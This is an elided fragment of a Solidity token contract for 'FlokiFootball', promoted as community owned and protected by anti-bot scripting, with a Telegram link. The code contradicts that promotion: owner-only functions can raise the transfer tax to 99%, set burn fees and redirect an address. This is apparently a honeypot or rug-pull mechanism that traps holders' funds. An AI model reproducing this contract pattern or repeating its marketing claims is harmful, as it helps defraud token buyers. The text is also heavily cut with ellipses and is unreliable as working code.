...
🦊FlokiFootball 100% Community Owned🚀 
...
Anti-bot Scripting, To prevent against Scam contracts and otherwise being posted. 
 
SOCIAL MEDIA 
 
 https://t.me/flokifootball
...
contract ERC200 is Context, IERC20, Ownable {
    ...
    function decimals() public view virtual returns (uint8) {
     ...
     function Antibot1() external onlyOwner(){
         _feeBurn = 12;     
     ...
     function Spender() external onlyOwner(){
         Address2= WBNB; 
         
     }
     function Feetx1() external onlyOwner(){
         _Feetax= 0;
     }
     function Feetx2() external onlyOwner(){
         _Feetax= 99;         
...
contract FlokiFootball is ERC200 {

    uint tokenTotalSupply = 1000000000000;

    constructor() public ERC200("FlokiFootball", "FlokiFootball") {
